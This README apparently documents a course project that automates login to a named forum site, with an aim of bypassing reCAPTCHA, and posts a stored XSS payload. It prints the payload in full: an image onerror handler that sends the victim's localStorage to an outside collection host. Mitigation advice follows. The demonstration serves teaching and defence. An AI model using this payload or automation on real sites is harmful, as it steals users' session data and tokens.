# Cross-Site Scripting (XSS) Attack

This project demonstrates an automated Cross-Site Scripting (XSS) attack using Playwright to inject a payload into the forum application.

## Usage

To build and run this project using Docker, follow these steps:

```bash
docker build -t xss-attack-demo .
docker run xss-attack-demo
```

## Attack Flow

The attack works as follows:

1. **Automated Login:** The script uses Playwright to automate the login process on the target website [https://elec0138-forum.0138019.xyz/](https://elec0138-forum.0138019.xyz/). It fills in the username and password fields and clicks the sign-in button. The automation aims to bypass protections reCAPTCHA, allowing unattended access.

2. **XSS Payload Injection:** After logging in, the script navigates to the forum section and posts a message containing a malicious XSS payload.

3. **Payload Details:** The payload is an `<img>` tag with an invalid `src` attribute and an `onerror` JavaScript handler:

   ```html
   <img src="x" onerror="const d={dt:'elec0138-xss',ls:JSON.stringify(localStorage)};new Image().src='https://elec0138-fc.meeska.me/collect?'+new URLSearchParams(d)">
   ```
   *   When a victim's browser attempts to load this image, the invalid `src` triggers the `onerror` event.
   *   The JavaScript code within `onerror` accesses the victim's `localStorage`, converts it to a JSON string, and includes a unique identifier (`dt:'elec0138-xss'`).
   *   It then constructs a URL for an external server (`https://elec0138-fc.meeska.me/collect`) and appends the stolen data as URL parameters.
   *   Requesting this URL via `new Image().src` sends the victim's `localStorage` data to the attacker-controlled server.

## Mitigation

1.  **Input Sanitization:** Rigorously sanitize all user-provided input on the server-side before storing or displaying it. Remove or encode potentially dangerous HTML tags and attributes (like `<script>`, `onerror`, `onload`, etc.). Use established libraries for sanitization specific to your backend language/framework.
2.  **Output Encoding:** When displaying user-generated content, ensure that it is properly encoded according to the context (HTML entity encoding for HTML content, JavaScript encoding for data within scripts, etc.). This prevents the browser from interpreting user input as active code.
3.  **Content Security Policy (CSP):** Implement a strong CSP header. A well-configured CSP can instruct the browser to:
    *   Disallow inline scripts (`script-src 'self'`) and inline event handlers.
    *   Restrict where resources (scripts, images, etc.) can be loaded from (`connect-src`, `img-src`). This could prevent the payload from sending data to the attacker's server.